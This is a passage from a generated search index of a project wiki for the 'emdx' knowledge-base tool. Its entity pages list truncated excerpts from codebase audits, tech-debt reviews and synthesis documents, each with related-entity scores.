(Ranked by Severity)</p> <p>...ync()<code>| Duplicate streaming logic from unified_executor | | **69.3** | 198 | 4 |</code>commands/delegate.py:521<code>|</code>delegate()<code>| Many flags and execution modes | | **67.6** | 151 | 4 |</code>commands/maintain.py:645<code>|</code>_cleanup_processes()` | Process health checking with mult...</p> </li> <li> <p>#6234 Delegate: Tech Debt Category Audit 2026-02-14 [14/14]   Section: CATEGORY 3: Code Organization &amp; Complexity</p> <p>...752 | Consider splitting | | <code>commands/analyze.py</code> | 743 | Consider splitting | | <code>commands/delegate.py</code> | 718 | Consider splitting |</p> </li> </ul>"},{"location":"entities/commandsdelegatepy/#usage-analysis","title":"Usage Analysis","text":""},{"location":"entities/commandsdelegatepy/#related-entities","title":"Related Entities","text":"<ul> <li><code>what works well</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>services/document_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>_stream_process()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>commands/cascade.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>services/unified_executor.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.1)</li> <li><code>services/tag_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>services/group_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>services/auto_tagger.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>executive summary comprehensive</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>commands/ask.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> </ul>"},{"location":"entities/commandsmaintainpy/","title":"commands/maintain.py","text":"<p>Type: tech_term | Mentioned in: 9 documents | First seen: 2026-02-13</p>"},{"location":"entities/commandsmaintainpy/#documents-9","title":"Documents (9)","text":"<ul> <li>#6873 Delegate: Document #6864 (Delegate synthesis [synthesis]):</li> </ul>"},{"location":"entities/commandsmaintainpy/#synthes-14","title":"Synthes [1/4]","text":"<p>Section: Entire Files That May Be Removable</p> <p>...methods are dead (<code>check_process_health</code> is used by <code>commands/executions.py</code> and <code>commands/maintain.py</code>, and <code>get_execution_metrics</code> by <code>commands/executions.py</code> \u2014 scratch that, those DO have callers) - <code>services/similarity.py</code> \u2014 <code>build_index</code>, <code>find_similar</code>, `fin...</p> <ul> <li> <p>#6324 Delegate: Architecture Improvement Analysis v0.14.0 [9/10]   Section: 2.5 Large File Decomposition (Medium Priority)</p> <p>...| <code>ui/document_browser.py</code> | 1122 | Already has presenter, push more into it | | <code>commands/maintain.py</code> | 1098 | Group related commands into submodules | | <code>commands/core.py</code> | 876 | Extract input handling helpers |</p> </li> <li> <p>#6316 Delegate: Comprehensive Codebase Quality Analysis [15/15]   Section: File Complexity Analysis</p> <p>...plex TUI widget | | <code>ui/document_browser.py</code> | 1,122 | Main browser component | | <code>commands/maintain.py</code> | 1,097 | Maintenance operations | | <code>commands/core.py</code> | 876 | Core CRUD commands |</p> </li> <li> <p>#6309 Delegate: Analyze FUNCTION COMPLEXITY across emdx/ (exclude ui/ and tests/)   Section: Top 15 Worst Offenders (Ranked by Severity)</p> <p>...eam_line()<code>| 9-level nesting for tool_call JSON parsing | | **96.9** | 149 | 6 |</code>commands/maintain.py:798<code>|</code>_cleanup_executions()<code>| Multiple nested categorization loops, complex health checks | | **93.3** | 138 | 6 |</code>commands/maintain.py:122<code>|</code>_interactive_wiza...</p> </li> <li> <p>#6236 Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]   Section: 1. MODULES WITH 0% TEST COVERAGE (CRITICAL)</p> <p>...6 public functions | Test <code>create</code>, <code>update</code>, <code>copy_to_clipboard</code>, auth flow | | <code>commands/maintain.py</code> | \ud83d\udd34 CRITICAL | 15 public functions | Test cleanup, auto-tag, merge, dedupe, garbage collect | | <code>commands/prime.py</code> | \ud83d\udd34 CRITICAL | 8 public functions | Test <code>prime</code>...</p> </li> <li> <p>#6235 Delegate: tech-debt,audit,comprehensive [12/14]   Section: \ud83d\udfe2 Low Priority Issues</p> </li> <li><code>ui/activity/activity_view.py</code> - 1175 lines</li> <li><code>ui/document_browser.py</code> - 1122 lines</li> <li> <p><code>commands/maintain.py</code> - 1097 lines</p> </li> <li> <p>#6234 Delegate: Tech Debt Category Audit 2026-02-14 [14/14]   Section: CATEGORY 3: Code Organization &amp; Complexity</p> <p>...ecomposition | | <code>ui/document_browser.py</code> | 1,122 | Needs decomposition | | <code>commands/maintain.py</code> | 1,097 | Needs decomposition** | | <code>commands/core.py</code> | 876 | Consider splitting | | <code>commands/cascade.py</code> | 754 | Consider splitting | | <code>utils/git_ops.py</code> | 75...</p> </li> <li> <p>#6222 Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]   Section: Commands (High Priority)</p> <p>...s()<code>| MEDIUM | Test log tailing, test kill operations, test zombie detection | |</code>commands/maintain.py<code>| All maintenance subcommands | HIGH | Test dry-run vs execute modes, test cleanup operations | |</code>commands/prime.py<code>|</code>prime()` | LOW | Test output formatting | |...</p> </li> <li> <p>#6183 Delegate: analysis,audit [13/17]   Section: \ud83d\udfe2 Minor</p> <ol> <li>Largest Files (complexity hotspots)    | File | Lines |    |------|-------|    | <code>database/migrations.py</code> | 1,992 |    | <code>commands/maintain.py</code> | 1,101 |    | <code>database/documents.py</code> | 1,063 |</li> </ol> </li> </ul>"},{"location":"entities/commandsmaintainpy/#21-large-ui-files","title":"21. Large UI Files","text":"<p>Location:</p>"},{"location":"entities/commandsmaintainpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>async functions</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.6)</li> <li><code>commands/executions.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>test_list_command</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>source files</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>services/document_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>largest files</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>large file decomposition</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>ui/search/search_screen.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>services/embedding_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>commands/cascade.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> </ul>"},{"location":"entities/common-themes/","title":"common themes","text":"<p>Type: heading | Mentioned in: 28 documents | First seen: 2026-02-11</p>"},{"location":"entities/common-themes/#documents-28","title":"Documents (28)","text":"<ul> <li>#6874 Delegate synthesis [synthesis] <p>The combined results reveal significant dead code accumulation across the project. ## Key Findings</p> </li> </ul>"},{"location":"entities/common-themes/#by-the-numbers","title":"By the Numbers","text":"<p>| Area | Dead Functions/Methods | Dead Constants | Entire Dead Files | |------|----------------------|----------------|-------...</p> <ul> <li> <p>#6864 Delegate synthesis [synthesis]</p> <p>Minor Inaccuracies in development-setup.md** Wrong file paths (<code>logging.py</code> vs <code>logging_utils.py</code>, <code>cli.py</code> doesn't exist), wrong test file count (52 vs 63), possibly wrong env var name (<code>EMDX_DB_PATH</code> vs <code>EMDX_DATABASE_URL</code>). ### Common Themes</p> </li> <li> <p>**...</p> </li> <li> <p>#6760 Wiki Generation Architecture: GitBook + Dendron Research [synthesis]</p> <ul> <li>Publishing \u2014 Next.js static site with three-column layout, permanent ID-based URLs, per-hierarchy publish controls. ---</li> </ul> </li> </ul>"},{"location":"entities/common-themes/#common-themes_1","title":"Common Themes","text":"Theme GitBook Dendron Implication for emdx ... <ul> <li>#6756 Dendron VS Code Extension Deep Dive [synthesis] <p>Internal fields (<code>fname</code>, <code>parent</code>, <code>children</code>, <code>body</code>, <code>links</code>) are engine-tracked, not serialized. ### Lookup (Note Discovery)</p> </li> <li>Powered by Fuse.js v6.4.6 with fuzzy matching against <code>fname</code> (threshold 0.2)</li> <li> <p>Supports extended search: <code>^prefix</code>...</p> </li> <li> <p>#6752 Academic Tool Research for Wiki Generation [synthesis]</p> <p>Stub/Orphan Detection (Wikipedia Tooling) Practical detection algorithms for identifying content gaps map directly to emdx's existing wikification infrastructure, providing heuristics for finding documents that need expansion, linking, or quality imp...</p> </li> <li> <p>#6711 Delegate synthesis [synthesis]</p> <p>Unifying them requires a common wrapper \u2014 which <code>ActivityItem</code> already provides. ### Common Themes</p> </li> <li> <p>ActivityItem is the right abstraction \u2014 just add <code>TaskItem</code> as a third subclass alongside <code>DocumentItem</code> and <code>AgentExecutionItem</code> 2.</p> </li> <li> <p>#6668 Prime Command Redesign: External Tool Research [synthesis]</p> <p>The 200-line cap on MEMORY.md is a notable limitation \u2014 topic files exist but aren't auto-loaded. ## Common Themes</p> </li> <li> <p>Lazy loading beats eager loading \u2014 All tools now defer heavy context loading until needed.</p> </li> <li> <p>#6654 Delegate synthesis [synthesis]</p> </li> </ul>"},{"location":"entities/common-themes/#readme-rewrite-strategy-synthesis-of-10-angles","title":"README Rewrite Strategy \u2014 Synthesis of 10 Angles","text":""},{"location":"entities/common-themes/#common-themes_2","title":"Common Themes","text":"<p>The core insight is universal across all angles: AI sessions are stateless, and emdx makes them compound. Every draft, regardless of framing, converges on the same loop: **save...</p> <ul> <li>#6583 Delegate synthesis [synthesis] </li> </ul>"},{"location":"entities/common-themes/#type-safety-audit-synthesis-emdxservices-emdxui-and-tests","title":"Type Safety Audit Synthesis: <code>emdx/services/</code>, <code>emdx/ui/</code>, and <code>tests/</code>","text":""},{"location":"entities/common-themes/#overview","title":"Overview","text":"<p>Three parallel audits examined the codebase for type safety gaps. The findings paint a consistent picture: **the production code has moderate <code>Any</code> usage that's m...</p> <ul> <li>#6574 Delegate synthesis [synthesis] </li> </ul>"},{"location":"entities/common-themes/#synthesis-emdx-core-architecture-overview","title":"Synthesis: EMDX Core Architecture Overview","text":""},{"location":"entities/common-themes/#key-findings","title":"Key Findings","text":"<p>The EMDX codebase follows a clear layered architecture with two primary domains:</p>"},{"location":"entities/common-themes/#commands-layer-emdxcommands","title":"Commands Layer (<code>emdx/commands/</code>)","text":"<p>The CLI entry points that users and agents interact with direct...</p> <ul> <li>#6567 Delegate synthesis [synthesis] <p>Synthesis (if enabled) prints only the combined summary</p> </li> </ul>"},{"location":"entities/common-themes/#5-git-integration","title":"5. Git Integration","text":"<ul> <li><code>--worktree</code>: Isolated execution environment</li> <li><code>--branch</code>: Push branch without PR (worktree retained)</li> <li><code>--pr</code>: Create PR after changes (worktree cleaned up)</li> <li> <p>`--draf...</p> </li> <li> <p>#6546 Delegate Enhancement Gameplans [synthesis]</p> <p>Query: Failed tasks where <code>prompt IS NOT NULL</code> (delegate only), <code>parent_task_id IS NULL</code> (top-level only)</p> </li> </ul> <p>Output Format:</p> <pre><code>RECENT FAILURES (2):\n  #38      Check database migrations\n         error: Connection refused... retry: emdx delegate...\n\n- **#6536** EMDX Future Directions: Agent-First Design [synthesis]\n  &gt; Delegate Resilience (Task 3)\n- **Pain point**: Single-shot execution; no retry, budgets, or quality gates\n- **Top solutions**:\n  - `--retry N` with exponential backoff\n  - `--budget $X` for cost limits\n  - `--gate lint,test` for quality checks before...\n\n- **#6531** Delegate synthesis [synthesis]\n  &gt; ## Key Findings\n\n### Architecture Evolution\n\n| PR | Direction | Impact |\n|----|-----------|--------|\n| #651 | **Removal** | -5,546 lines - Cascade system deleted |\n| #652 | **Addition** | +1,432 lines - Structured recipes replace cascade |\n| #650 | *...\n\n- **#6521** Delegate synthesis [synthesis]\n  &gt; # Synthesis: Re-implementing Smart Priming &amp; Ask-KB Improvements\n\n## Executive Summary\n\nTwo PRs were closed without merging on 2026-02-15:\n- **PR #446 (FEAT-5):** Smart Priming \u2014 Most features already implemented via alternative approaches; **one sig...\n\n- **#6511** None Type Analysis [synthesis]\n  &gt; The goal was to identify which annotations are **necessary** (represent genuine nullable states) versus **unnecessary** (could be removed or simplified). ## Key Findings\n\n| Module | Total `| None` | Necessary | Unnecessary | Accuracy |\n|--------|----...\n\n- **#6509** Any Type Removal Analysis [synthesis]\n  &gt; # Any Type Removal Analysis \u2014 Synthesis\n\nA comprehensive analysis of `Any` type annotations across the EMDX codebase with specific replacement recommendations. ## Executive Summary\n\n| Category | Files | Any Count | Fixable |\n|----------|-------|-----...\n\n- **#6455** Delegate Synthesis Test Results [synthesis]\n  &gt; **Identical responses** \u2014 Both agents appropriately asked for clarification rather than guessing at intent\n3. **Test run detected** \u2014 Task 2's note explicitly identifies this as \"part of a parallel delegate test run\"\n\n## Common Themes\n\n- Both agents ...\n\n- **#6437** Any/None typing audit [synthesis]\n  &gt; **Dynamic Kwargs** (4 occurrences) - `**kwargs: Any`\n   - Used in update functions with whitelist validation\n   - **Verdict**: Mixed - some are unused (remove), others are intentional (consider TypedDict)\n\n4. **Return Types** (2 occurrences) - `-&gt; di...\n\n- **#6426** Delegate synthesis [synthesis]\n  &gt; The most complex upgrade is Textual 6.x \u2192 7.x, which requires Rich 14.x as a co-dependency. ## Upgrade Overview\n\n| Package | Current | Target | Risk | Key Concern |\n|---------|---------|--------|------|-------------|\n| pytest | ^7.0.0 | ^9.0.0 | Low ...\n\n- **#6419** Type System Audit: Replace Any/None with Concrete Types [synthesis]\n  &gt; These can be replaced with concrete TypedDict definitions to improve type safety, IDE autocompletion, and code maintainability. ## Key Findings\n\n### Scope of Changes\n\n| Module | Functions Found | Priority |\n|--------|----------------|----------|\n| `e...\n\n- **#6406** Bug Fix PR Reviews [synthesis]\n  &gt; Overall quality is high with well-targeted fixes. ## Summary by PR\n\n| PR | Title | Verdict | Key Finding |\n|----|-------|---------|-------------|\n| #589 | Cascade stage update race condition | \u2705 APPROVE | Correctly removes masking clause, adds stage ...\n\n- **#6368** Gameplans: compact, distill, and draft-pr [synthesis]\n  &gt; `emdx delegate --draft` Flag\n\n**Purpose:** Create draft PRs instead of regular PRs for review-first workflows. **Design Decision:** Use `--draft` as a modifier to `--pr` (not a standalone flag)\n- Mirrors `gh pr create --draft` semantics\n- Composes na...\n\n- **#6283** Delegate synthesis [synthesis]\n  &gt; Database Migration Debt Fixed (PR #512)\n\n- **11 foreign keys** changed from `ON DELETE NO ACTION` \u2192 `ON DELETE SET NULL`\n- Added `LOWER(title)` indexes on `documents` and `tasks` tables\n- Preserves execution/task history when related records deleted\n...\n\n- **#6153** PR Review Sprint: Smart Ops Synthesis\n  &gt; All PRs align well with their respective gameplans, demonstrating good architectural consistency and code quality. ## Summary by PR\n\n| PR | Feature | Verdict | Key Issue |\n|----|---------|---------|-----------|\n| #446 | Smart Priming | \u2705 Approve with...\n\n- **#6081** Delegate synthesis [synthesis]\n  &gt; **Task 1**: 2 + 2 = **4**\n2. **Task 2**: 3 + 3 = **6**\n\n## Common Themes\n\n- Both operations are simple addition of identical numbers (doubling)\n- Results follow the expected mathematical pattern where n + n = 2n\n\n## Summary\n\nThe tasks demonstrate cor...\n\n- **#6512** None Type Analysis [synthesis]\n  &gt; Dataclass Default Factory Pattern\n**`emdx/utils/git_ops.py:33`**:\n```python\n# Before\nworktrees: list['GitWorktree'] | None = None\n\n# After (cleaner)\nworktrees: list['GitWorktree'] = field(default_factory=list)\n</code></pre>"},{"location":"entities/common-themes/#5-executor-result-fields","title":"5. Executor Result Fields","text":"<p>**`un...</p>"},{"location":"entities/common-themes/#related-entities","title":"Related Entities","text":"<ul> <li><code>unified summary</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.9)</li> <li><code>overview three</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.9)</li> <li><code>actionable next steps</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.9)</li> <li><code>zero mock specs = zero regression safety net</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>unspecced mocks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>typed parameters</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>type safety audit synthesis:</code>emdx/services/<code>,</code>emdx/ui/<code>, and</code>tests/` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>type safety audit synthesis</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>the production code has moderate</code>any<code>usage that's mostly fixable, while the test suite has zero</code>spec=<code>coverage across 220+ mocks \u2014 a significant regression risk.</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>actionable items (priority order)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.5)</li> </ul>"},{"location":"entities/compactpy/","title":"compact.py","text":"<p>Type: heading | Mentioned in: 8 documents | First seen: 2026-02-15</p>"},{"location":"entities/compactpy/#documents-8","title":"Documents (8)","text":"<ul> <li>#6503 None Type Analysis [2/7]   Section: File-by-File Analysis </li> <li><code>doc_ids: list[int] | None = typer.Argument(default=None, ...)</code> - Legitimate: discovery mode if not provided</li> <li> <p><code>topic: str | None = typer.Option(None, ...)</code> -...</p> </li> <li> <p>#6745 Wiki Generation Architecture Research [2/10]   Section: Integration Points</p> <p>Builds directly on existing <code>synthesis_service.py</code>, <code>compact.py</code> (cluster discovery), <code>wikify_service.py</code> (auto-linking), and <code>entity_service.py</code> (cross-references). The new <code>WikiSynthesisService</code> would extend the existing patter...</p> </li> <li> <p>#6743 wiki-synthesis-research   Section: Integration with Existing emdx Infrastructure</p> <p>...rsing. Needs new prompt templates for wiki-style output.</p> </li> <li> <p><code>compact</code> command (<code>compact.py</code>) \u2014 already handles cluster discovery (TF-IDF + union-find), cost estimation, and superseded tagging. Wiki generation is a quality upgrade to compact's synthesis. -...</p> </li> <li> <p>#6508 Any Type Removal Analysis [synthesis]   Section: Files by Priority</p> <p>...gh | <code>unified_search.py</code> | 5 | 5 | | High | <code>ask_service.py</code> | 6 | 6 | | Medium | <code>compact.py</code> | 7 | 5 | | Medium | <code>distill.py</code> | 5 | 4 | | Medium | <code>palette_presenter.py</code> | 5 | 5 | | Medium | <code>text_areas.py</code> | 3 | 3 | | Low | <code>tasks.py</code> | 2 | 1 | | Low | `e...</p> </li> <li> <p>#6476 EMDX Knowledge Base Enhancement: Complete Implementation Guide   Section: Implementation Components</p> </li> <li>Registered as lazy command in <code>main.py</code></li> <li>Discovery mode: Free TF-IDF clustering  </li> <li>Synthesis mode: Claude API merging</li> <li> <p>Archives originals with <code>superseded</code> tags</p> </li> <li> <p>#6367 Gameplan: emdx compact \u2014 AI-Powered KB Synthesis   Section: Key Files</p> <p>...ervice.py<code>| NEW | Shared synthesis logic for compact + distill | |</code>emdx/commands/compact.py<code>| NEW | CLI command implementation | |</code>emdx/services/document_merger.py<code>| EXTEND | Add</code>group_clusters()<code>method | |</code>emdx/config/constants.py<code>| EXTEND | Add</code>CO...</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>...: All necessary</p> </li> <li>browse.py: All necessary</li> <li>briefing.py: 1 bug to fix</li> <li>compact.py: All necessary</li> <li> <p>executions.py: 1 special case (tri-state bool)</p> </li> <li> <p>#6504 Any Type Removal Analysis [5/5]   Section: Summary</p> <p>...mdx/commands/delegate.py<code>| 3 | 3 | All are</code>**kwargs<code>wrappers | |</code>emdx/commands/compact.py<code>| 7 | 5 | Similarity matrix is tricky | |</code>emdx/commands/distill.py<code>| 5 | 4 | Audience enum return is fine | |</code>emdx/commands/review.py` | 2 | 2 | Simple JSON seri...</p> </li> </ul>"},{"location":"entities/compactpy/#compactpy_1","title":"compact.py","text":""},{"location":"entities/compactpy/#compact-command-emdxcommandscompactpy","title":"Compact Command (<code>emdx/commands/compact.py</code>)","text":""},{"location":"entities/compactpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>wikisynthesisservice</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>taskupdatekwargs</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>print_json</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>groupupdatekwargs</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>executionupdatekwargs</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>distilldocumentrow</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>compactdocumentrow</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>review.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>retry.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>synthesis layer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> </ul>"},{"location":"entities/completed/","title":"completed","text":"<p>Type: heading | Mentioned in: 11 documents | First seen: 2025-07-07</p>"},{"location":"entities/completed/#documents-11","title":"Documents (11)","text":"<ul> <li> <p>#6298 Delegate: DEBT-31: Add missing Architecture Decision Records (ADRs)   Section: DEBT-31: Add Missing Architecture Decision Records (ADRs)</p> </li> <li> <p>#6758 Delegate: Research how to get progress/status information from a runni   Section: 2. <code>claude --print --output-format stream-json</code> \u2014 The Key Opportunity</p> <p>...esponses + tool_use blocks (Read, Edit, Bash, etc.) | | <code>tool_call</code> | <code>started</code> / <code>completed</code> | Individual tool invocations with args and results | | <code>thinking</code> | <code>delta</code> / <code>completed</code> | Extended thinking activity | | <code>content_block_delta</code> | <code>text_delta</code> | S...</p> </li> <li> <p>#6678 Delegate Slimming Research [1/3]   Section: (A) COULD MOVE TO A HOOK</p> <p>...nd.sh<code>already extracts metrics from the transcript. The execution status update (</code>completed<code>/</code>failed<code>+ exit code) could move there too. Same timeout caveat as #20. | | 22 | **Model tagging** (adding</code>model:opus<code>,</code>model-ver:...` to tags) | 457\u2013465 | **Stop...</p> </li> <li> <p>#6374 Codebase Bug Audit 2026-02-15 [2/10]   Section: Low Severity Bugs</p> <p>...un_id, start_doc, start_stage, stop_stage, current_stage, status, pr_url, started, completed = row<code>\u2014</code>completed<code>is unpacked but never used (assigned via</code># noqa: E501`). Impact: Minor; unused variable.</p> </li> <li> <p>#6180 Delegate: Task System Comprehensive Analysis [15/15]   Section: Core Components</p> <p>...g tasks to actual executions</p> </li> <li>Execution types: <code>direct</code> (Claude), <code>manual</code> (human-completed), <code>workflow</code> (legacy)</li> <li>Status tracking: <code>running</code>, <code>completed</code>, <code>failed</code>, <code>cancelled</code></li> <li> <p>Links to <code>executions</code> table for log files and process tracking</p> </li> <li> <p>#6168 Delegate: Analyze the emdx task system's data model and database schem [1/15]   Section: Task Fields</p> <p>...P | now | Creation time | | <code>updated_at</code> | TIMESTAMP | now | Last update time | | <code>completed_at</code> | TIMESTAMP | NULL | Completion time (set when status=done) |</p> </li> <li> <p>#451 Tag Taxonomy for EMDX Project Management   Section: Core Workflow Tags</p> <p>...ked` - Waiting on external dependencies</p> </li> <li><code>needs-review</code> - Ready for evaluation</li> <li><code>completed</code> - Finished successfully</li> <li> <p><code>abandoned</code> - Discontinued/cancelled</p> </li> <li> <p>#450 Claude Code Tag System Enhancement Ideas   Section: Claude Code Tag System Enhancement Ideas</p> <p>...tomatically apply workflow tags:</p> </li> <li><code>gameplan</code>, <code>analysis</code>, <code>todo</code>, <code>in-progress</code>, <code>completed</code></li> <li><code>successful</code>, <code>failed</code>, <code>blocked</code>, <code>needs-review</code></li> <li> <p><code>priority-high</code>, <code>priority-medium</code>, <code>priority-low</code></p> </li> <li> <p>#6464 Claude Document Templates Comprehensive Guide   Section: Implementation Template</p> </li> <li>Type: #IMPLEMENTATION</li> <li>Status: #IMPLEMENTED</li> <li>Original Plan: #[ID]</li> <li> <p>Completed: YYYY-MM-DD</p> </li> <li> <p>#32 Claude Document Templates Quick Reference   Section: For Implementations</p> </li> <li>Type: #IMPLEMENTATION</li> <li>Status: #IMPLEMENTED</li> <li>Plan: #[original-plan-id]</li> <li> <p>Completed: YYYY-MM-DD</p> </li> <li> <p>#33 Claude Output Templates Guide   Section: Standard Templates for Claude</p> </li> <li>Type: #IMPLEMENTATION  </li> <li>Status: #IMPLEMENTED</li> <li>Original Plan: #[ID]</li> <li>Completed: YYYY-MM-DD</li> </ul>"},{"location":"entities/completed/#completed_1","title":"Completed","text":"<p>Created <code>docs/adr/</code> directory with 5 files (491 lines total):</p>"},{"location":"entities/completed/#metadata","title":"Metadata","text":""},{"location":"entities/completed/#metadata_1","title":"Metadata","text":""},{"location":"entities/completed/#metadata_2","title":"Metadata","text":""},{"location":"entities/completed/#related-entities","title":"Related Entities","text":"<ul> <li><code>[title] plan</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>workflow</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> 